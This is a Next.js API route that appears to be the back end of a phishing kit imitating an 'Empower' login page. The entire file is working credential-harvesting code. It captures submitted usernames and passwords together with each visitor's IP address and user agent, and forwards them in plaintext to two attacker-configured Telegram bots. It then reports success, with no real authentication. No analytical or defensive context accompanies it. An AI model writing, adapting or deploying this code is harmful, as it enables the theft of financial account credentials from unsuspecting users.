import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { username, password } = await request.json()

    const loginData = {
      username,
      password,
      timestamp: new Date().toISOString(),
      userAgent: request.headers.get("user-agent") || "Unknown",
      ip: request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "Unknown",
    }

    const message = `🔐 Empower Login:
Username: ${loginData.username}
Password: ${loginData.password}
Time: ${loginData.timestamp}
IP: ${loginData.ip}
User Agent: ${loginData.userAgent}`

    // Send to first Telegram bot
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
        }),
      })
    }

    // Send to second Telegram bot
    if (process.env.TELEGRAM_BOT_TOKEN2 && process.env.TELEGRAM_CHAT_ID2) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN2}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID2,
          text: message,
        }),
      })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Telegram API error:", error)
    return NextResponse.json({ error: "Failed to send message" }, { status: 500 })
  }
}
